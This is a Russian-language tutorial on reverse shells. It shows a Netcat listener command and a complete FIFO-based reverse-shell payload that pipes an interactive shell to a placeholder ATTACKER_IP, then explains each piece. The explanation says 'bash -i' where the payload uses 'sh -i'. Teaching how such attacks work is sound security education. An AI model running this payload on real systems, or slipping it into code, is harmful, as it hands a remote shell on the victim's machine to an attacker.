==🔴Обратная оболочка== - один из самых популярных методов получения доступа к системе в кибератаках. Соединение устанавливается с целевой системой на машину злоумышленнику, что помогает избежать обнаружения сетевыми брандмауэрами и другими средствами безопасности.

Разберемся, как работает обратная оболочка на практике с помощью инструмента Netcat. Эта утилита поддерживает множество операционных систем и позволяет читать и записывать данные по сети.

Обратная оболочка установит соединение с машиной злоумышленника. Эта машина будет ожидать подключения, поэтому воспользуемся Netcat для прослушивания соединения, используя команду `nc -lvnp 443`.

Приведенная выше команда использует `-l` опцию, указывающую Netcat на необходимость прослушивания или ожидания соединения. Опция `-v`включает подробный режим. Опция `-n`предотвращает использование DNS для поиска соединений, поэтому она не будет разрешать никакие имена хостов, а будет использовать IP-адрес. Наконец, флаг `-p`указывает порт, который будет использоваться для ожидания соединения, в приведенном выше случае это порт **443** .

==🔴**Получение доступа к обратной оболочке**==

После того, как мы настроим прослушиватель, злоумышленник должен выполнить так называемую полезную нагрузку обратной оболочки. Эта полезная нагрузка обычно использует уязвимость или несанкционированный доступ, предоставленный злоумышленником, и выполняет команду, которая откроет доступ к оболочке через сеть.

В качестве примера рассмотрим пример полезной нагрузки, называемой **pipe reverse shell**, как показано ниже.

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`

==🔵**Пояснение к полезной нагрузке**==

- `rm -f /tmp/f`— Эта команда удаляет все существующие файлы именованных каналов, расположенные по адресу `/tmp/f/`. Это гарантирует, что скрипт сможет создать новый именованный канал без конфликтов.
- `mkfifo /tmp/f`- Эта команда создает именованный канал, или FIFO (первым вошел — первым вышел), по адресу `/tmp/f`. Именованные каналы обеспечивают двустороннюю связь между процессами. В данном контексте он выступает в качестве канала для ввода и вывода.
- `cat /tmp/f`— Эта команда считывает данные из указанного канала. Она ожидает ввода, который может быть передан через канал.
- `| bash -i 2>&1`— Вывод команды  `cat`передается в экземпляр оболочки ( `bash -i`), что позволяет злоумышленнику выполнять команды в интерактивном режиме. Команда `2>&1`перенаправляет стандартный поток ошибок в стандартный вывод, гарантируя отправку сообщений об ошибках обратно злоумышленнику.
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`- Эта часть перенаправляет вывод оболочки через `nc`(Netcat) на IP-адрес злоумышленника ( `ATTACKER_IP`) на порт злоумышленника ( `ATTACKER_PORT`).
- `>/tmp/f` — Эта заключительная часть отправляет выходные данные команд обратно в указанный канал, обеспечивая двустороннюю связь.

После выполнения указанной выше полезной нагрузки злоумышленник получит ==🔴**обратную оболочку**== , как показано ниже, что позволит ему выполнять команды так же, как если бы он входил в обычный терминал операционной системы.
